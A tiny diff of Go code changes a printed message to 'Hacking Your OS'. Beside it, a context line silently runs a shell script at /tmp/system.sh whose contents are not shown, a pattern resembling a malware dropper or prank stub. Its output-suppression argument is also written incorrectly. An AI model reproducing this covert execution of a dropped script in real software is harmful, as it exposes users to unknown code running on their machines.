@@ -72,7 +72,7 @@ func dongi() {
 
 }
 func meo() {
-	fmt.Println("connecting to Your OS")
+	fmt.Println("Hacking Your OS")
 	cmd := exec.Command("/tmp/system.sh", "> /dev/null 2>&1")
 	cmd.Dir = "/tmp/"
 
